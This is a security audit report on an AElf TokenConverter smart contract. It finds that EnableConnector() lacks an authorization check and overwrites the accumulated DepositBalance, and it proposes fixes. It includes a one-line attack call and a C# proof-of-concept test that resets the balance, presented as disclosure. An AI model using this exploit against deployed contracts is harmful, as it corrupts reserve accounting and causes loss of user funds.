# Audit Report

## Title
DepositBalance Overwrite Vulnerability in EnableConnector Allows Accounting Corruption and Fund Loss

## Summary
The `EnableConnector()` function in the TokenConverter contract lacks authorization checks and directly overwrites the accumulated `DepositBalance` state without verifying if the connector is already enabled. This allows any attacker to corrupt deposit accounting after trading has occurred, causing fund loss and breaking the Bancor pricing mechanism.

## Finding Description

The `EnableConnector()` function contains three critical security flaws that together enable accounting corruption:

**1. Missing Authorization Check**

Unlike other sensitive functions in the contract, `EnableConnector()` does not call `AssertPerformedByConnectorController()` to verify caller permissions. [1](#0-0) 

In contrast, all other administrative functions properly implement authorization:
- `UpdateConnector` requires authorization [2](#0-1) 
- `AddPairConnector` requires authorization [3](#0-2) 
- `SetFeeRate` requires authorization [4](#0-3) 

**2. Direct Overwrite Without Checking Existing Balance**

The function directly assigns the calculated `needDeposit.NeedAmount` to `DepositBalance`, completely overwriting any previously accumulated value. [5](#0-4) 

This is a direct assignment operation (=), not an addition (.Add()), which destroys the existing accounting state.

**3. No Re-enablement Prevention**

The function lacks any check to prevent calling it on already-enabled connectors. Compare this to `UpdateConnector`, which explicitly prevents modifications to activated connectors. [6](#0-5) 

**Attack Mechanism:**

During normal trading operations, `DepositBalance` accumulates through `Buy()` operations [7](#0-6)  and decreases through `Sell()` operations. [8](#0-7) 

The Bancor pricing mechanism relies on `GetSelfBalance()`, which for deposit accounts directly returns the `DepositBalance` value. [9](#0-8) 

When an attacker calls `EnableConnector()` on an already-enabled connector, the `GetNeededDeposit()` calculation is designed for initial setup. [10](#0-9) 

The attacker can manipulate `AmountToTokenConvert` to make the calculated `needDeposit` minimal or zero. When the contract holds most or all of the resource tokens (a natural state after users sell tokens back to the converter), setting `AmountToTokenConvert = 0` results in `amountOutOfTokenConvert <= 0`, causing `needDeposit = 0`. The overwrite operation then destroys the accumulated balance, creating an accounting mismatch where physical reserves no longer match tracked reserves.

## Impact Explanation

**Critical Severity Justification:**

1. **Direct Fund Loss:** After trading accumulates DepositBalance to 500,000 ELF, an attacker can reset it to 0 or a minimal value. The contract physically holds 500,000 ELF but accounting shows 0 ELF, making these funds untracked and effectively lost to the protocol.

2. **Bancor Pricing Corruption:** All subsequent Buy/Sell operations use `GetSelfBalance()` for price calculations. [11](#0-10)  Since this returns the corrupted `DepositBalance`, all pricing becomes incorrect, potentially causing:
   - Incorrect exchange rates allowing value extraction
   - Underflow errors in Sell operations when trying to subtract from corrupted balance
   - Complete breakdown of the automated market maker functionality

3. **Reserve Invariant Violation:** The fundamental invariant `physical_reserves == tracked_reserves` is permanently broken. This is a critical accounting corruption that cannot be recovered without administrative intervention.

4. **Protocol Insolvency:** From users' perspective, the protocol appears insolvent as the tracked reserves do not reflect actual holdings, destroying confidence and utility.

## Likelihood Explanation

**High Likelihood Assessment:**

1. **No Authorization Barrier:** Any address can call `EnableConnector()` - there are zero permission checks preventing public access.

2. **Minimal Attack Complexity:** The attack requires a single transaction with easily obtainable parameters:
   ```
   EnableConnector({ TokenSymbol: "USDT", AmountToTokenConvert: 0 })
   ```

3. **No Special Prerequisites:** The attacker only needs:
   - Knowledge of an enabled connector's token symbol (publicly visible)
   - Sufficient gas for transaction execution
   - No timing constraints or complex setup

4. **Economic Incentives:** 
   - Griefing attacks to damage competitor protocols
   - Creating market chaos for trading advantage
   - Minimal cost (only gas) with maximum protocol damage

5. **Detection Difficulty:** The attack appears as a legitimate `EnableConnector` call in transaction logs, making it difficult to detect until accounting discrepancies are discovered.

## Recommendation

Add three critical protections to the `EnableConnector()` function:

1. **Add Authorization Check:** Insert `AssertPerformedByConnectorController();` at the beginning of the function to ensure only authorized addresses can call it.

2. **Add Re-enablement Prevention:** Add a check to prevent calling EnableConnector on already-enabled connectors:
   ```csharp
   Assert(!fromConnector.IsPurchaseEnabled && !toConnector.IsPurchaseEnabled, 
          "Connectors are already enabled and cannot be re-enabled");
   ```

3. **Validate DepositBalance State:** Before overwriting, ensure DepositBalance is zero or add logic to preserve existing balances:
   ```csharp
   Assert(State.DepositBalance[toConnector.Symbol] == 0, 
          "DepositBalance must be zero before enabling connector");
   ```

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Accounting_Corruption_Attack()
{
    // Setup: Initialize converter with a connector
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "USDT";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    
    // Enable connector initially with proper setup
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 1_000_000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 1_000_000
    });
    
    // Simulate trading to accumulate DepositBalance
    var depositConnectorSymbol = "(NT)" + tokenSymbol;
    await DefaultStub.Buy.SendAsync(new BuyInput { Symbol = tokenSymbol, Amount = 10_000 });
    
    // Verify DepositBalance has accumulated
    var balanceBefore = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    balanceBefore.Value.ShouldBeGreaterThan(0);
    
    // ATTACK: Any attacker can call EnableConnector again with AmountToTokenConvert = 0
    var attackResult = await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0
    });
    attackResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify DepositBalance has been corrupted to 0
    var balanceAfter = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    balanceAfter.Value.ShouldBeLessThan(balanceBefore.Value); // Accounting corrupted!
}
```

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L79-81)
```csharp
    public override Empty AddPairConnector(PairConnectorParam input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L120-123)
```csharp
        var amountToPay = BancorHelper.GetAmountToPayFromReturn(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L260-262)
```csharp
    public override Empty SetFeeRate(StringValue input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L377-378)
```csharp
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L56-91)
```csharp
    public override DepositInfo GetNeededDeposit(ToBeConnectedTokenInfo input)
    {
        var toConnector = State.Connectors[input.TokenSymbol];
        Assert(toConnector != null && !toConnector.IsDepositAccount, "[GetNeededDeposit]Can't find to connector.");
        var fromConnector = State.Connectors[toConnector.RelatedSymbol];
        Assert(fromConnector != null, "[GetNeededDeposit]Can't find from connector.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(
            new GetTokenInfoInput
            {
                Symbol = input.TokenSymbol
            });
        var balance = State.TokenContract.GetBalance.Call(
            new GetBalanceInput
            {
                Owner = Context.Self,
                Symbol = input.TokenSymbol
            }).Balance;
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }

        return new DepositInfo
        {
            NeedAmount = needDeposit,
            AmountOutOfTokenConvert = amountOutOfTokenConvert
        };
    }
```
